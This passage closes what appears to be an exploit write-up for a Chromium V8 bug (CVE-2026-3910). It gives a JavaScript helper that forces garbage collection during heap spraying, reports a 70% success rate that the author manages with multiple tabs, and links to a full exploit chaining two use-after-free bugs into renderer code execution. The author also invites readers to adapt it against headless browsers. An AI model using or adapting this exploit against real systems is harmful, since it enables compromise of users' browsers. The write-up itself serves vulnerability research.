For GC function it’s trivially implemented with allocating big `ArrayBuffer`s which [apparently](https://tiszka.com/blog/CVE_2021_21225_exploit.html#:~:text=Trick%20%232%3A%20Triggering%20Major%20GC%20without%20spraying%20the%20heap) get allocated in it’s own space, two birds one stone since we don’t want to mess up our two UAFs spraying steps.

```jsx
function gc(options) {
  if (options.type === "minor") {
    for (let i = 0; i < 4; i++) {
      new Array(0x10000);
    }
  } else if (options.type === "major" && options.flavor == "last-resort") {
    new ArrayBuffer(0x80000000);
    new ArrayBuffer(0x80000000);
  } else if (options.type === "major") {
    new ArrayBuffer(0x80000000);
  }
}
```

The spraying might fail sometimes, the exploit success rate is about 70%, but that’s easily managed by multiple tabs/iframes.

# **Epilogue**

The exploit is horrifically disgusting, you can find it in [full here](https://github.com/mwlik/v8-ndays/tree/main/CVE-2026-3910/exploit.html), this bug combines two UAF bugs and an out-of-sandbox read primitive, to get code execution in the chromium’s 146 renderer process, you can adapt this exploit to your needs and for other browser versions to pwn headless browsers for example (they usually run with `—-no-sandbox`), responsibly of course!
